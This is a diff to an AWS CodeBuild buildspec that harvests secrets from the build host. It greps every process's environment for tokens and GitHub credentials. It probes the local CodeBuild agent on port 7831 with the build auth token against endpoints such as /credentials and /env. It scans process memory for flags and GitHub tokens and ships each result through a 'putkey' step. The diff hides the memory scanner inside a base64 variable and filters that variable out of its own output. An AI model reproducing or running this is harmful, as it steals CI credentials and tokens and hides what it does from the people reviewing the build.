@@ -4,6 +4,7 @@ env:
   variables:
     AWS_MAX_ATTEMPTS: "1"
     AWS_RETRY_MODE: "standard"
+    PYSCAN_B64: "aW1wb3J0IG9zLHJlCnBhdHRlcm5zPVtyZS5jb21waWxlKHJiJ2ZsYWdce1tefVx4MDBcclxuXXsxLDIwMH1cfScscmUuSSkscmUuY29tcGlsZShyYidjdGZce1tefVx4MDBcclxuXXsxLDIwMH1cfScscmUuSSkscmUuY29tcGlsZShyYidIYWNrVHJpY2tzXHtbXn1ceDAwXHJcbl17MSwyMDB9XH0nLHJlLkkpLHJlLmNvbXBpbGUocmInY29kZWJyZWFjaFteXHgwMFxyXG5dezAsMjAwfScscmUuSSkscmUuY29tcGlsZShyYidnaFtvcHN1XV9bQS1aYS16MC05X117MjAsMTIwfScpXQpwcmludCgnPT09IG1lbW9yeSBzY2FuID09PScpCmZvciBwaWQgaW4gW3ggZm9yIHggaW4gb3MubGlzdGRpcignL3Byb2MnKSBpZiB4LmlzZGlnaXQoKV06CiAgICB0cnk6CiAgICAgICAgY21kPW9wZW4oZicvcHJvYy97cGlkfS9jbWRsaW5lJywncmInKS5yZWFkKCkucmVwbGFjZShiJ1wwJyxiJyAnKVs6MjAwXQogICAgICAgIG1hcHM9b3BlbihmJy9wcm9jL3twaWR9L21hcHMnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIG1lbT1vcGVuKGYnL3Byb2Mve3BpZH0vbWVtJywncmInLDApCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIGNvbnRpbnVlCiAgICBzZWVuPXNldCgpCiAgICBmb3IgbGluZSBpbiBtYXBzOgogICAgICAgIHBhcnRzPWxpbmUuc3BsaXQoKQogICAgICAgIGlmIGxlbihwYXJ0cyk8MiBvciAncicgbm90IGluIHBhcnRzWzFdOiBjb250aW51ZQogICAgICAgIGlmIGxlbihwYXJ0cyk+PTYgYW5kIGFueShzIGluIHBhcnRzWy0xXSBmb3IgcyBpbiBbJy91c3IvbGliLycsJy9yb290Ly5nb2Vudi8nLCcvcm9vdC8uZG90bmV0LycsJy9vcHQvYXBhY2hlLWFudCddKTogY29udGludWUKICAgICAgICBhLGI9W2ludCh4LDE2KSBmb3IgeCBpbiBwYXJ0c1swXS5zcGxpdCgnLScpXQogICAgICAgIGlmIGItYT41MDAwMDAwMDogY29udGludWUKICAgICAgICB0cnk6CiAgICAgICAgICAgIG1lbS5zZWVrKGEpOyBkYXRhPW1lbS5yZWFkKGItYSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGZvciBwYXQgaW4gcGF0dGVybnM6CiAgICAgICAgICAgIGZvciBtIGluIHBhdC5maW5kYWxsKGRhdGEpOgogICAgICAgICAgICAgICAgcz1tWzoyMjBdCiAgICAgICAgICAgICAgICBpZiBzIGluIHNlZW46IGNvbnRpbnVlCiAgICAgICAgICAgICAgICBzZWVuLmFkZChzKQogICAgICAgICAgICAgICAgaWYgcy5zdGFydHN3aXRoKChiJ2docF8nLGInZ2hvXycsYidnaHNfJyxiJ2dodV8nKSk6IHM9c1s6OF0rYicuLi5SRURBQ1RFRCcKICAgICAgICAgICAgICAgIHByaW50KGYncGlkPXtwaWR9IGNtZD17Y21kIXJ9IGhpdD17cyFyfScpCiAgICB0cnk6IG1lbS5jbG9zZSgpCiAgICBleGNlcHQgRXhjZXB0aW9uOiBwYXNzCg=="
 
 phases:
   build:
@@ -22,7 +23,7 @@ phases:
           for p in /proc/[0-9]*; do
             pid=${p##*/}; [ -r "$p/environ" ] || continue
             echo "--- pid $pid $(tr '\0' ' ' < "$p/cmdline" | head -c 200)"
-            tr '\0' '\n' < "$p/environ" | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN' | grep -Ei 'flag|token|secret|github|codebuild|pat|gh[opsu]_|credential|webhook|source|repo|auth' || true
+            tr '\0' '\n' < "$p/environ" | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN|PYSCAN_B64' | grep -Ei 'flag|token|secret|github|codebuild|pat|gh[opsu]_|credential|webhook|source|repo|auth' || true
           done
           echo '=== agent route/auth strings ==='
           for b in /codebuild/readonly/agent /codebuild/readonly/executor /codebuild/readonly/start /codebuild/readonly/bootstrap-log /codebuild/readonly/executor-log /codebuild/output/log; do
@@ -34,14 +35,7 @@ phases:
         {
           echo '=== agent with auth variants ==='
           for base in http://127.0.0.1:7831 http://localhost:7831; do
-            for h in \
-              "Authorization: $CODEBUILD_AUTH_TOKEN" \
-              "Authorization: Bearer $CODEBUILD_AUTH_TOKEN" \
-              "Authorization: Basic $CODEBUILD_AUTH_TOKEN" \
-              "X-CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN" \
-              "X-Amz-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" \
-              "X-Aws-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" \
-              "CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN"; do
+            for h in "Authorization: $CODEBUILD_AUTH_TOKEN" "Authorization: Bearer $CODEBUILD_AUTH_TOKEN" "X-CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN" "X-Amz-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" "CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN"; do
               echo "### $base header ${h%%:*}"
               for p in / /ping /health /status /v1/status /v1/metadata /v1/build /build /logs /env /variables /credentials /api/v1/build; do
                 echo "--- $p"
@@ -51,37 +45,6 @@ phases:
           done
         } > /tmp/agentauth.txt 2>&1
         putkey agentauth /tmp/agentauth.txt
-        cat > /tmp/memscan.py <<'PY'
-import os,re
-patterns=[re.compile(rb'flag\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'ctf\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'HackTricks\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'codebreach[^\x00\r\n]{0,200}',re.I),re.compile(rb'gh[opsu]_[A-Za-z0-9_]{20,120}')]
-print('=== memory scan ===')
-for pid in [x for x in os.listdir('/proc') if x.isdigit()]:
-    try:
-        cmd=open(f'/proc/{pid}/cmdline','rb').read().replace(b'\0',b' ')[:200]
-        maps=open(f'/proc/{pid}/maps','r').read().splitlines()
-        mem=open(f'/proc/{pid}/mem','rb',0)
-    except Exception as e:
-        continue
-    seen=set()
-    for line in maps:
-        parts=line.split()
-        if len(parts)<2 or 'r' not in parts[1]: continue
-        if len(parts)>=6 and any(s in parts[-1] for s in ['/usr/lib/','/root/.goenv/','/root/.dotnet/','/opt/apache-ant']): continue
-        a,b=[int(x,16) for x in parts[0].split('-')]
-        if b-a>50_000_000: continue
-        try:
-            mem.seek(a); data=mem.read(b-a)
-        except Exception:
-            continue
-        for pat in patterns:
-            for m in pat.findall(data):
-                s=m[:220]
-                if s in seen: continue
-                seen.add(s)
-                if s.startswith((b'ghp_',b'gho_',b'ghs_',b'ghu_')): s=s[:8]+b'...REDACTED'
-                print(f'pid={pid} cmd={cmd!r} hit={s!r}')
-    try: mem.close()
-    except Exception: pass
-PY
+        echo "$PYSCAN_B64" | base64 -d > /tmp/memscan.py
         python3 /tmp/memscan.py > /tmp/memscan.txt 2>&1
         putkey memscan /tmp/memscan.txt
